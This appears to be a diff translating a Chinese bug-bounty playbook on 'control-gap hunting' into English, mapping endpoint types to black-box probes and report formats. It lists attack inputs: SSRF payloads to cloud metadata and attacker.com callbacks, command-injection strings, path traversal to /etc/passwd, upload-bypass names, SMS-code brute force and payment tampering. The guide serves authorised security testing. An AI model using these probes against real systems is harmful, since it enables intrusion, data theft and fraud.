@@ -1,238 +1,238 @@
-# 控制缺口（Control Gap）狩猎
+# Control-gap hunting
 
-> 白盒视角：检查"代码里有没有这个控制" → 黑盒视角：探测"这个控制是否真的生效"
-> 这是猎手拿到一个新功能、不知道从哪入手时的 SOP
-
----
-
-## 1. 思维模型
-
-**敏感操作 = 应有控制矩阵 → 黑盒探针 = 测每个控制是否缺失。**
-
-```
-看到端点 → 归类（数据修改 / 资金 / 文件 / SSRF / 认证 / 权限 / 命令 / 越权 / 信息）
-         ↓
-        翻表 → 该类型应该有哪 N 个控制
-         ↓
-对每个控制 → 设计探针：在不满足该控制的条件下访问，看响应
-         ↓
-        哪个返回 200 / 业务成功 → 漏洞
-```
-
-九大类操作 + 探针速查在第 3 章。
+> White-box view: check "does this control exist in the code". Black-box view: probe "is this control actually enforced".
+> This is the SOP for when a hunter gets a new feature and doesn't know where to start.
 
 ---
 
-## 2. 端点分类速查
+## 1. Mental model
 
-| 端点特征 | 类型 |
+**Sensitive operation = the matrix of controls it should have → black-box probe = test whether each control is missing.**
+
+```
+See an endpoint → classify it (data modification / funds / files / SSRF / auth / privilege / command / broken access / information)
+         ↓
+        Look up the table → which N controls this type should have
+         ↓
+For each control → design a probe: access it without satisfying that control, and observe the response
+         ↓
+        Whichever returns 200 / business success → a vulnerability
+```
+
+The nine operation classes and their probe quick-reference are in section 3.
+
+---
+
+## 2. Endpoint classification quick-reference
+
+| Endpoint trait | Type |
 |---------|------|
-| `POST/PUT/DELETE` + 资源 ID | 数据修改 |
-| `GET` + 单个 ID（`/order/{id}`） | 数据访问 |
-| 含 `export`、`download`、`batch` | 批量 |
-| 含 `role`、`permission`、`grant` | 权限变更 |
-| 含 `transfer`、`pay`、`refund`、`balance` | 资金 |
-| 接受 URL 参数（`?url=`、`?fetch=`、`?import=`、回调） | SSRF |
-| `multipart/form-data` 上传 | 文件上传 |
-| 含 `file`、`path`、`filename`、`download` | 文件读 / 删 |
-| 含 `cmd`、`exec`、`ping`、`nslookup`、`shell` | 命令执行 |
-| `/login`、`/reset`、`/verify`、`/sms` | 认证 |
+| `POST/PUT/DELETE` + a resource ID | Data modification |
+| `GET` + a single ID (`/order/{id}`) | Data access |
+| Contains `export`, `download`, `batch` | Bulk |
+| Contains `role`, `permission`, `grant` | Privilege change |
+| Contains `transfer`, `pay`, `refund`, `balance` | Funds |
+| Accepts a URL parameter (`?url=`, `?fetch=`, `?import=`, a callback) | SSRF |
+| `multipart/form-data` upload | File upload |
+| Contains `file`, `path`, `filename`, `download` | File read / delete |
+| Contains `cmd`, `exec`, `ping`, `nslookup`, `shell` | Command execution |
+| `/login`, `/reset`, `/verify`, `/sms` | Authentication |
 
 ---
 
-## 3. 9 类操作 × 探针表
+## 3. The 9 operation classes x probe tables
 
-### 3.1 数据修改 (CREATE / UPDATE / DELETE)
+### 3.1 Data modification (CREATE / UPDATE / DELETE)
 
-| 应有控制 | 黑盒探针 | 缺失则 |
+| Expected control | Black-box probe | If missing |
 |---------|---------|-------|
-| 鉴权 | 删 Authorization / Cookie，发请求 | 未授权写 → P0 |
-| 资源所有权 | 用账号 A 改 B 的资源 ID | IDOR / 越权 → P1 |
-| 输入验证 | 改类型（int → "abc"）、长度溢出 | 报错 / 崩溃 → 信息泄露 |
-| 输入完整性 | 加额外字段 `is_admin=true` | Mass Assignment → P0 |
-| 操作确认 | 直接 DELETE 不带二次确认 token | 误删 / CSRF |
+| Authentication | Drop Authorization / Cookie, send the request | Unauthenticated write → P0 |
+| Resource ownership | Use account A to modify B's resource ID | IDOR / broken access → P1 |
+| Input validation | Change the type (int → "abc"), overflow the length | Error / crash → information disclosure |
+| Input integrity | Add an extra field `is_admin=true` | Mass assignment → P0 |
+| Operation confirmation | DELETE directly without a second-confirmation token | Accidental deletion / CSRF |
 
-### 3.2 数据访问（READ）
+### 3.2 Data access (READ)
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| 改 ID 序号（自增）/ 改 UUID（猜不动就枚举）/ 改 hash | IDOR |
-| 删除认证后访问 | 未授权数据泄露 |
-| `?ids=1,2,3,...,10000` 批量 | 大面积泄露 |
-| 改字段筛选（`?fields=*` 或 GraphQL） | 字段级泄露 |
+| Change the ID number (incremental) / change the UUID (enumerate if unguessable) / change the hash | IDOR |
+| Access after dropping authentication | Unauthorized data disclosure |
+| `?ids=1,2,3,...,10000` in bulk | Large-scale disclosure |
+| Change the field filter (`?fields=*` or GraphQL) | Field-level disclosure |
 
-### 3.3 批量 / 导出
+### 3.3 Bulk / export
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| 改导出范围（`startDate=2010-01-01`） | 全量泄露 |
-| 删除范围限制 / 用户筛选 | 跨租户泄露 |
-| 高频调用 / 大并发 | DoS / 资源耗尽 |
-| 改导出对象 ID（导出他人订单） | 越权批量 |
+| Change the export range (`startDate=2010-01-01`) | Full disclosure |
+| Drop the range limit / user filter | Cross-tenant disclosure |
+| High-frequency calls / high concurrency | DoS / resource exhaustion |
+| Change the export object ID (export another user's orders) | Broken-access bulk |
 
-### 3.4 权限变更
+### 3.4 Privilege change
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| 普通用户调用 `/role/grant` | 鉴权缺失提权 (P0) |
-| 自己授予自己 admin | 自提权 (P0) |
-| 普通管理员授予 super_admin | 边界缺失 (P0) |
-| 改请求体 `role: admin` 等隐藏字段（IDOR + Mass Assignment） | 关键提权 (P0) |
+| An ordinary user calls `/role/grant` | Missing authorization, privilege escalation (P0) |
+| Grant yourself admin | Self-escalation (P0) |
+| An ordinary admin grants super_admin | Missing boundary (P0) |
+| Change hidden body fields like `role: admin` (IDOR + mass assignment) | Critical escalation (P0) |
 
-### 3.5 资金
+### 3.5 Funds
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| 金额改 0 / 0.01 / 负数 / 1e-10 | 金额校验缺失 (P0) |
-| 改商品 ID 但保留低价 | 服务端不重算 → 任意支付 |
-| 重放支付回调（同一签名两次） | 幂等缺失 → 双花 |
-| 并发 50 次同请求 | 竞态 → 透支 / 双发卡券 |
-| 把折扣券叠加 / 退货后回退优惠券 | 业务逻辑漏洞 |
+| Change the amount to 0 / 0.01 / negative / 1e-10 | Missing amount validation (P0) |
+| Change the product ID but keep the low price | Server does not recompute → arbitrary payment |
+| Replay the payment callback (same signature twice) | Missing idempotency → double spend |
+| 50 concurrent identical requests | Race condition → overdraft / duplicate coupon issuance |
+| Stack discount coupons / refund the coupon after a return | Business-logic flaw |
 
-参考：WooYun-2015-0108817（电商价格篡改）。
+Reference: WooYun-2015-0108817 (e-commerce price tampering).
 
-### 3.6 外部 HTTP（SSRF）
+### 3.6 Outbound HTTP (SSRF)
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| `?url=http://127.0.0.1` / `[::1]` / `2130706433` | 内网封禁缺失 |
-| `?url=file:///etc/passwd` | 协议白名单缺失 |
-| `?url=http://169.254.169.254/...` | 云元数据可达 |
-| `?url=http://attacker.com` 看是否回连 | DNSLog 验证基本 SSRF |
-| `?url=http://attacker.com` 触发 302 → 内网 | 重定向跟随未限制 |
-| DNS Rebinding（`rbndr.us`） | 二次解析逃逸白名单 |
+| `?url=http://127.0.0.1` / `[::1]` / `2130706433` | Missing internal-network block |
+| `?url=file:///etc/passwd` | Missing protocol allowlist |
+| `?url=http://169.254.169.254/...` | Cloud metadata reachable |
+| `?url=http://attacker.com` to see whether it calls back | DNSLog verifies basic SSRF |
+| `?url=http://attacker.com` triggering a 302 → internal | Redirect following not restricted |
+| DNS rebinding (`rbndr.us`) | Second resolution escapes the allowlist |
 
-### 3.7 文件上传
+### 3.7 File upload
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| 改扩展名 `.php` `.jsp` `.asp` `.phtml` `.jspx` | 黑名单缺失 |
-| `.Php` / `.pHp%20` / `.php.` | 大小写 / 空格绕过 |
-| `shell.php%00.jpg` | 截断绕过（旧版） |
-| `Content-Type: image/jpeg` 但内容是脚本 | MIME 仅靠 Header |
-| 文件名加 `../` | 路径校验缺失 |
-| 上传后访问目录列表 | 命名规则猜测 |
-| 内容含图片头 + 脚本（图片马） | 解析漏洞配合 |
+| Change the extension to `.php` `.jsp` `.asp` `.phtml` `.jspx` | Missing blocklist |
+| `.Php` / `.pHp%20` / `.php.` | Case / space bypass |
+| `shell.php%00.jpg` | Null-byte truncation bypass (older versions) |
+| `Content-Type: image/jpeg` but the body is a script | MIME check relies on the header only |
+| Add `../` to the filename | Missing path validation |
+| Access the directory listing after upload | Naming-scheme guessing |
+| Content with an image header + a script (image-embedded webshell) | Combined with a parsing flaw |
 
-### 3.8 文件读 / 下载 / 删除
+### 3.8 File read / download / delete
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| `?file=../../etc/passwd` 各级 | 路径规范化缺失 |
-| `?file=/etc/passwd`（绝对路径） | 前缀校验缺失 |
-| `?file=file:///etc/passwd` | 协议过滤缺失 |
-| 删除接口：`?path=../../web/index.html` | **任意文件删（易遗漏！）** |
-| 大小写：`?file=../../ETC/PASSWD` | 黑名单 lower |
+| `?file=../../etc/passwd` at each depth | Missing path canonicalization |
+| `?file=/etc/passwd` (absolute path) | Missing prefix check |
+| `?file=file:///etc/passwd` | Missing protocol filtering |
+| Delete endpoint: `?path=../../web/index.html` | **Arbitrary file delete (easily missed!)** |
+| Case: `?file=../../ETC/PASSWD` | Blocklist only lowercases |
 
-### 3.9 命令执行（含 ping / nslookup / 工具类）
+### 3.9 Command execution (including ping / nslookup / tool endpoints)
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| `127.0.0.1; id` / `\| id` / `&& id` / `` `id` `` / `$(id)` | 拼接符过滤缺失 |
-| `127.0.0.1%0aid` | 换行绕过 |
-| `127.0.0.1 -c1 -W1 ; sleep 5` | 时间盲（无回显） |
-| `ping ${LDAP}.attacker.com` 看 DNSLog | 外带验证 |
-| 命令字 cat / curl 被过滤时换 tac / wget | 关键字过滤 |
+| `127.0.0.1; id` / `\| id` / `&& id` / `` `id` `` / `$(id)` | Missing separator filtering |
+| `127.0.0.1%0aid` | Newline bypass |
+| `127.0.0.1 -c1 -W1 ; sleep 5` | Time-based blind (no echo) |
+| `ping ${LDAP}.attacker.com` and watch DNSLog | Out-of-band verification |
+| When cat / curl is filtered, switch to tac / wget | Keyword filtering |
 
-### 3.10 认证操作
+### 3.10 Authentication operations
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| 短信验证码爆破（4–6 位数字、无频率限制） | 验证码爆破 |
-| 验证码不刷新（同一码用多次） | 验证码可重用 |
-| 验证码绑定关系：用 A 手机收到的码改 B 密码 | 验证码与用户解绑 |
-| 重置流程跳步骤（直接 GET 第 3 步页面） | 流程跳跃 |
-| 改请求体 `username=victim` | 凭证参数可控 |
-| 撞库（公开数据库 + 无频率限制） | 撞库 |
+| Brute-force the SMS code (4-6 digits, no rate limit) | Verification-code brute force |
+| Code does not refresh (same code used repeatedly) | Reusable verification code |
+| Code binding: use the code A's phone received to change B's password | Code decoupled from the user |
+| Skip steps in the reset flow (GET the step-3 page directly) | Flow-step skipping |
+| Change the body `username=victim` | Credential parameter is controllable |
+| Credential stuffing (public database + no rate limit) | Credential stuffing |
 
-详见 `playbooks/logic-flaws.md` 4 大密码重置模式。
+See the 4 password-reset patterns in `playbooks/logic-flaws.md`.
 
-### 3.11 越权（独立类，常被错过）
+### 3.11 Broken access control (its own class, often missed)
 
-| 探针 | 缺失则 |
+| Probe | If missing |
 |------|-------|
-| 水平：账号 A 改 B 资源（同级越权） | IDOR (P1) |
-| 垂直：普通用户调用 admin API | 后端鉴权仅看 JWT 而不看 role (P0) |
-| Header 越权：`X-User-Role: admin` 注入 | Header 信任 (P0) |
-| Cookie 越权：改 Cookie 中 `role` / `userId` | 客户端可控会话 (P0) |
-| Method 越权：DELETE 不行就试 OPTIONS / `X-HTTP-Method-Override` | 方法过滤不全 |
+| Horizontal: account A modifies B's resource (same-level) | IDOR (P1) |
+| Vertical: an ordinary user calls an admin API | Backend authz only checks the JWT, not the role (P0) |
+| Header-based: inject `X-User-Role: admin` | Header trust (P0) |
+| Cookie-based: change `role` / `userId` in the cookie | Client-controllable session (P0) |
+| Method-based: if DELETE fails, try OPTIONS / `X-HTTP-Method-Override` | Incomplete method filtering |
 
 ---
 
-## 4. "新功能 5 分钟探针套餐"
+## 4. The "new feature 5-minute probe combo"
 
-拿到一个新功能，先做这 5 步（约 5–10 分钟）：
+When you get a new feature, do these 5 steps first (about 5-10 minutes):
 
 ```
-1. 抓 1 个完整请求（保留所有 Header / Cookie / Body）
-   → 看请求里有什么"看起来重要的字段"
+1. Capture 1 complete request (keep all headers / cookies / body)
+   → see what "important-looking fields" it contains
 
-2. 删掉 Authorization / Cookie，重发
-   → 看是否还能用（未授权）
+2. Drop Authorization / Cookie and resend
+   → see whether it still works (unauthenticated)
 
-3. 改 1 个 ID 字段（数字 +1 / 换 UUID / 换租户）
-   → 看是否能拿到他人数据（IDOR）
+3. Change 1 ID field (increment the number / swap the UUID / swap the tenant)
+   → see whether you can get another user's data (IDOR)
 
-4. 改 1 个看起来"客户端不该控制"的字段
-   （price / role / status / is_admin / amount / userId）
-   → 看是否生效（Mass Assignment / 篡改）
+4. Change 1 field that "the client shouldn't control"
+   (price / role / status / is_admin / amount / userId)
+   → see whether it takes effect (mass assignment / tampering)
 
-5. 加一个 corner case 字段（重复参数 / null / 长字符串 / 数组）
-   → 看返回是否变化或报错（信息泄露 / 类型混淆）
+5. Add a corner-case field (duplicate parameter / null / long string / array)
+   → see whether the response changes or errors (information disclosure / type confusion)
 ```
 
-5 步过完没有发现，再进对应 playbook 深挖。
+If nothing turns up after these 5 steps, go into the matching playbook to dig deeper.
 
 ---
 
-## 5. 控制缺口报告写法
+## 5. How to write up a control gap
 
-报告里把这些用同一个表格格式呈现，平台审核很喜欢：
+Present these in the report using a single table format; platform reviewers like it:
 
 ```markdown
-## 控制缺口分析
+## Control-gap analysis
 
-| 应有控制 | 在该端点是否生效 | 证据 |
+| Expected control | Enforced at this endpoint? | Evidence |
 |---------|----------------|------|
-| 鉴权 | ✓ 缺 Authorization 返回 401 | （包略） |
-| 资源所有权 | ✗ 账号 A 可读 B 数据 | 见 PoC §1 |
-| 输入完整性 | ✗ 接受 `is_admin=true` 字段 | 见 PoC §2 |
-| 操作审计 | ? 无法从外部判断 | - |
+| Authentication | ✓ Dropping Authorization returns 401 | (request omitted) |
+| Resource ownership | ✗ Account A can read B's data | See PoC §1 |
+| Input integrity | ✗ Accepts the `is_admin=true` field | See PoC §2 |
+| Operation auditing | ? Cannot be judged externally | - |
 
-漏洞结论：缺失"资源所有权" + "Mass Assignment 防护"，
-组合可导致普通用户提权为 admin。
+Conclusion: missing "resource ownership" + "mass-assignment protection",
+which combined let an ordinary user escalate to admin.
 ```
 
 ---
 
-## 6. 易遗漏的盲区
+## 6. Easily missed blind spots
 
-> 来自 WooYun + 真实 SRC 报告分析的"高频盲区"
+> The "high-frequency blind spots" from analyzing WooYun + real SRC reports
 
-1. **文件删除**——大家只测上传 / 下载，忘了 DELETE。任意文件删可瘫服务（删 `index.html`）。
-2. **批量参数**（`ids=1,2,3,...,10000`）——单个 IDOR 受限制时，批量接口往往没限制。
-3. **导出范围**（`startDate=2010-01-01`）——把分页放大 / 把日期放回十年前。
-4. **OPTIONS / HEAD**——很多鉴权拦截只针对 GET/POST。
-5. **二次接口 / 内部接口**——通过抓 mobile app / 微信小程序常发现"PC 没暴露的"接口。
-6. **WebSocket / SSE**——文档不写、流量不抓的话很容易漏掉。
-7. **GraphQL 深嵌套**——顶层加权限，子字段没加（详见 `playbooks/graphql.md`）。
-8. **登出 / 注销 redirect_uri**——OAuth 几乎所有人都忘记白名单 logout。
-9. **第三方回调** （short URL / sms / pay 回调）——回调 endpoint 经常无签名。
+1. **File deletion** — everyone tests upload / download but forgets DELETE. Arbitrary file delete can take down the service (delete `index.html`).
+2. **Bulk parameters** (`ids=1,2,3,...,10000`) — when a single IDOR is restricted, the bulk endpoint often is not.
+3. **Export range** (`startDate=2010-01-01`) — widen the paging / push the date back ten years.
+4. **OPTIONS / HEAD** — a lot of authz interception only targets GET/POST.
+5. **Secondary / internal endpoints** — capturing the mobile app / WeChat mini-program often reveals endpoints not exposed on PC.
+6. **WebSocket / SSE** — easily missed if undocumented and its traffic isn't captured.
+7. **GraphQL deep nesting** — permission at the top level, but not on sub-fields (see `playbooks/graphql.md`).
+8. **Logout / sign-out redirect_uri** — nearly everyone forgets to allowlist the OAuth logout.
+9. **Third-party callbacks** (short URL / sms / pay callbacks) — the callback endpoint is often unsigned.
 
-每次审计花 5 分钟过一遍这 9 个盲区，能挖到不少 P1。
+Spending 5 minutes each audit going through these 9 blind spots turns up plenty of P1s.
 
 ---
 
-## 7. 与 playbook 的衔接
+## 7. Handoff to the playbooks
 
-发现某类型缺失控制 → 进入对应 playbook 深挖：
+Found a missing control of some type → go into the matching playbook to dig deeper:
 
-| 缺失控制 | 对应 playbook |
+| Missing control | Matching playbook |
 |---------|--------------|
-| 鉴权 / 资源所有权 | `playbooks/unauth-access.md`、`playbooks/logic-flaws.md` (越权) |
-| URL 白名单 / 协议过滤 | `playbooks/ssrf-cache-host.md` |
-| 文件类型 / 路径 | `playbooks/file-upload.md`、`playbooks/path-traversal.md` |
-| 命令白名单 / 拼接 | `playbooks/rce.md` |
-| 验证码 / 凭证绑定 | `playbooks/logic-flaws.md` |
-| 输入验证（SQL / XSS） | `playbooks/sqli.md`、`playbooks/xss.md` |
-| 金额 / 幂等 / 并发 | `playbooks/logic-flaws.md`、`playbooks/race-conditions.md` |
+| Authentication / resource ownership | `playbooks/unauth-access.md`, `playbooks/logic-flaws.md` (broken access) |
+| URL allowlist / protocol filtering | `playbooks/ssrf-cache-host.md` |
+| File type / path | `playbooks/file-upload.md`, `playbooks/path-traversal.md` |
+| Command allowlist / concatenation | `playbooks/rce.md` |
+| Verification code / credential binding | `playbooks/logic-flaws.md` |
+| Input validation (SQL / XSS) | `playbooks/sqli.md`, `playbooks/xss.md` |
+| Amount / idempotency / concurrency | `playbooks/logic-flaws.md`, `playbooks/race-conditions.md` |
